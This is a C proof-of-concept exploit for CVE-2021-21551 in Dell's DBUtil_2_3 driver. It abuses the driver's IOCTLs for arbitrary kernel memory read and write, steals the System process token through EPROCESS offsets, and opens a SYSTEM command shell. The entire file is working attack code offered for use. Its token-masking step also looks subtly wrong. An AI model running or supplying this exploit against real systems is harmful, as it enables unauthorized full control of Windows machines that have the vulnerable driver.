#include "D:\work\SDK\ntdll.h"
#pragma comment(lib, "ntdll.lib")

#include <Windows.h>
#include <stdio.h>

PCHAR GetKernelBase()
{
	DWORD dwSize = 0;
	NtQuerySystemInformation(SystemModuleInformation, 0, dwSize, &dwSize);

	PRTL_PROCESS_MODULES pSystemModules = (PRTL_PROCESS_MODULES)malloc(dwSize);
	NtQuerySystemInformation(SystemModuleInformation, pSystemModules, dwSize, &dwSize);

	DWORD dwCount = pSystemModules->NumberOfModules;
	printf("[+] Found %d system modules\n", dwCount);

	for (DWORD i = 0; i < dwCount; i++)
	{
		if (strstr((const char*)pSystemModules->Modules[i].FullPathName, "ntoskrnl.exe"))
		{
			PCHAR pBase = (PCHAR)pSystemModules->Modules[i].ImageBase;
			printf("[+] Found kernel base at 0x%p\n", pBase);

			free(pSystemModules);
			return pBase;
		}
	}

	free(pSystemModules);
	return 0;
}

typedef struct _IOCTL_STRUCT
{
	ULONGLONG unk0;
	PCHAR address;
	ULONGLONG zero;
	PCHAR value;
} IOCTL_STRUCT;

PCHAR ReadKernelMemory(HANDLE hDevice, PCHAR addr)
{
	DWORD dwBytesReturned;
	IOCTL_STRUCT ioctl_struct;

	ioctl_struct.address = addr;
	ioctl_struct.zero = 0;
	
	DeviceIoControl(hDevice, 0x9b0c1ec4, &ioctl_struct, sizeof(ioctl_struct), &ioctl_struct, sizeof(ioctl_struct), &dwBytesReturned, nullptr);
	
	return ioctl_struct.value;
}

void WriteKernelMemory(HANDLE hDevice, PCHAR addr, PCHAR value)
{
	DWORD dwBytesReturned;
	IOCTL_STRUCT ioctl_struct;

	ioctl_struct.address = addr;
	ioctl_struct.zero = 0;
	ioctl_struct.value = value;

	DeviceIoControl(hDevice, 0x9b0c1ec8, &ioctl_struct, sizeof(ioctl_struct), &ioctl_struct, sizeof(ioctl_struct), &dwBytesReturned, nullptr);
}

DWORD main(DWORD argc, CHAR* argv[])
{
	printf("\n******************************************\n");
	printf("CVE-2021-21551 PoC exploit by mathisvickie");
	printf("\n******************************************\n\n");

	DWORD EPROCESS_ActiveProcessLinks = 0x2e8;
	DWORD EPROCESS_Token = 0x348;

	HMODULE hNtOsKrnl = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
	PCHAR PsInitialSystemProcess = (PCHAR)GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (PCHAR)hNtOsKrnl + GetKernelBase();

	printf("[+] Found PsInitialSystemProcess at 0x%p\n", PsInitialSystemProcess);
	FreeLibrary(hNtOsKrnl);
	
	HANDLE hDevice = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	printf("[+] Opened vulnerable device handle 0x%p\n", hDevice);

	PCHAR SystemEPROCESS = ReadKernelMemory(hDevice, PsInitialSystemProcess);
	printf("[+] Found System EPROCESS struct at 0x%p\n", SystemEPROCESS);

	PCHAR ActiveProcessLinks = ReadKernelMemory(hDevice, SystemEPROCESS + EPROCESS_ActiveProcessLinks);

	PCHAR SystemToken = (PCHAR)((ULONGLONG)ReadKernelMemory(hDevice, SystemEPROCESS + EPROCESS_Token) & 0xf0);
	printf("[+] Stealing system token 0x%p\n", SystemToken);

	while (true)
	{
		if ((DWORD)ReadKernelMemory(hDevice, ActiveProcessLinks - 8) == GetCurrentProcessId())
		{
			PCHAR CurrentEPROCESS = ActiveProcessLinks - EPROCESS_ActiveProcessLinks;
			printf("[+] Found current EPROCESS struct at 0x%p\n", CurrentEPROCESS);

			printf("[+] Overriding current token now...\n");
			WriteKernelMemory(hDevice, CurrentEPROCESS + EPROCESS_Token, SystemToken);

			break;
		}

		ActiveProcessLinks = ReadKernelMemory(hDevice, ActiveProcessLinks);
	}

	CloseHandle(hDevice);

	system("cmd");

	getchar();
	return 0;
}
